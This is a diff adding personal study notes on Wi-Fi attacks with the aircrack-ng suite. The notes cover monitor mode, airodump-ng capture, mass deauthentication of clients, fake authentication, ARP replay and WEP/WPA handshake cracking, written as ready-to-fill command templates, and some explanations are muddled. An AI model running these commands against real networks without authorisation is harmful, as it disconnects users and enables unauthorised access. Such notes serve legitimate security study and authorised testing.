@@ -1,0 +1,56 @@
+Set the adaptor in monitor mode
+
+  1.ifconfig <interface> down
+	airmon-ng check kill
+	iwconfig <interface> mode monitor
+	ifconfig <interface> up
+  2.airmon-ng start <interface> //notice that interface name changes
+
+Use airodump-ng to dump all the network around us
+Use airodump-ng to collect info about a specific network
+
+	airodump-ng <interface>
+		BSSID: Mac address
+		PWR:	 signal strength
+		ESSID: Name of the network
+		Beacons: Frames send by network to broadcast it's existence
+		#Data: number of Data frames 
+		#/s: Number of data packets that we collect in 10 seconds
+
+	airodump-ng <options> <interface>[,<interface>,...]
+	airodump-ng --bssid <####> --channel <##> -w <name of file> <interface>
+
+
+DEAUTHENTICATION:
+ Characters: A,H,C
+ H, is we who acts as joker
+ telling A i am C(who is actually H)
+ telling C i am A(who is actually H)
+
+ Use aireplay-ng to disconnect user from Access Point(nothing but wifi)
+ Use aireplay-ng to fake authenticate router that we are trusted ones
+ Use aireplay-ng to send fake packets to router to make it busy 
+
+ aireplay-ng <options> <replay interface>
+ aireplay-ng --deauth 100000 -a <access point mac address> -c <user mac address which need to be disconnected> -i <interface we are trying to send packets from>
+
+FAKE AUTHENTICATION:
+ Use aireplay-ng --fakeauth <number of packets , 0 is fine> -a <router mac address> -h<attaking machine mac addr> -i <interfac>
+ Under AUTH in airodump-ng it shows OPN(means open) but we're not actually connected but we authenticated ourselves to capture the packets
+ We use fake authentication so that we can make dull network to busy network you can observe under data column of data 		#airodump-ng
+ 		ARP REQUEST REPLAY -- SEND PACKETS
+ 		For this we need aireplay-ng
+ 		Use aireplay-ng 
+ 		aireplay-ng --arpreplay -b<router mac address-- careful that we use switch -b> -h<host mac_addr> -i<interface> 	 
+
+
+
+CRACKING:
+  Use aircrack-ng
+
+  To crack wep networks just use aircrack-ng <captured .cap file>
+  Wait until 5000 IVs reached    
+
+  WPA/WPA2- Cracking
+
+  aircrack-ng going to use wordlist and compare each created wordlist with BSSID -- creates -- PMK(Pairwise Master Key) -- uses algorithm PBKDF2 -- compare PMK with handshake -- if PMK valid -- password == password used to create PMK 
